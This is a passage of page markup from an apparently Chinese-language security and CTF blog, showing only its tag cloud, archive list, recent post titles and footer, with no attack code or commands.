href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwngdb/" rel="tag">pwngdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2csu/" rel="tag">ret2csu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/root/" rel="tag">root</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/safe-linking/" rel="tag">safe-linking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stdout/" rel="tag">stdout</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uaf/" rel="tag">uaf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtual-memory/" rel="tag">virtual memory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/" rel="tag">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" rel="tag">世界杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="tag">数据泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%86%B3/" rel="tag">解决</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%97%AE%E9%A2%98/" rel="tag">问题</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/0day/" style="font-size: 10px;">0day</a> <a href="/tags/2025/" style="font-size: 10px;">2025</a> <a href="/tags/BOCCHI-THE-ROCK/" style="font-size: 10px;">BOCCHI THE ROCK</a> <a href="/tags/IO-file/" style="font-size: 10px;">IO_file</a> <a href="/tags/PHP/" style="font-size: 11.67px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/UEFI/" style="font-size: 10px;">UEFI</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/IO-FILE/" style="font-size: 10px;">_IO_FILE</a> <a href="/tags/IO-FILEt/" style="font-size: 10px;">_IO_FILEt</a> <a href="/tags/malloc-hook/" style="font-size: 11.67px;">_malloc_hook</a> <a href="/tags/debug-symbol/" style="font-size: 10px;">debug-symbol</a> <a href="/tags/dirsearch/" style="font-size: 10px;">dirsearch</a> <a href="/tags/fastbin/" style="font-size: 10px;">fastbin</a> <a href="/tags/git-leak/" style="font-size: 10px;">git leak</a> <a href="/tags/glibc/" style="font-size: 16.67px;">glibc</a> <a href="/tags/header/" style="font-size: 10px;">header</a> <a href="/tags/heap/" style="font-size: 18.33px;">heap</a> <a href="/tags/heap-feng-shui/" style="font-size: 10px;">heap_feng_shui</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/house-of-apple2/" style="font-size: 11.67px;">house of apple2</a> <a href="/tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="/tags/inline-hook/" style="font-size: 10px;">inline hook</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/match/" style="font-size: 10px;">match</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 11.67px;">orw</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwngdb/" style="font-size: 10px;">pwngdb</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/root/" style="font-size: 10px;">root</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 11.67px;">shellcode</a> <a href="/tags/stack/" style="font-size: 11.67px;">stack</a> <a href="/tags/stdout/" style="font-size: 10px;">stdout</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unauthorized/" style="font-size: 10px;">unauthorized</a> <a href="/tags/unlink/" style="font-size: 11.67px;">unlink</a> <a href="/tags/unserialize/" style="font-size: 11.67px;">unserialize</a> <a href="/tags/virtual-memory/" style="font-size: 10px;">virtual memory</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/windows/" style="font-size: 11.67px;">windows</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 11.67px;">世界杯</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 11.67px;">反序列化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a> <a href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">九月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2026/01/28/i4tools-unauthorized-RCE/">i4tools unauthorized RCE</a>
          </li>
        
          <li>
            <a href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/">PHP反序列化入门 - [NISACTF 2022]babyserialize</a>
          </li>
        
          <li>
            <a href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/">PHP反序列化入门 - no_wakeup</a>
          </li>
        
          <li>
            <a href="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/">2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup</a>
          </li>
        
          <li>
            <a href="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/">Windows RPC 初探</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2026 j1ans<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>